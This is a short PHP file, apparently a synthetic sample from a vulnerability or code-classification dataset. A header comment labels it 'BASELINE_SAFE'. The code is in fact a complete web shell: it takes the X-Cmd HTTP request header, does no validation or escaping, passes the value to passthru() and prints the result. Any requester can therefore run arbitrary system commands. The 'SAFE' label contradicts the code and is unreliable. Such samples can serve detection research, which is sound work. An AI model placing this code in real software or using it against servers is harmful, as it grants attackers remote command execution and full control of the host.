<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_ISSET; SKELETON=S3; KEY=cmd; SINK=B4; VAR=v0155; HDR_NAME=X-Cmd */
function SINK_B4($command){
    passthru($command);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = isset($h["X-Cmd"]) ? (string)$h["X-Cmd"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B4($x);
};
$out = $f($inp);
echo (string)($out);
?>
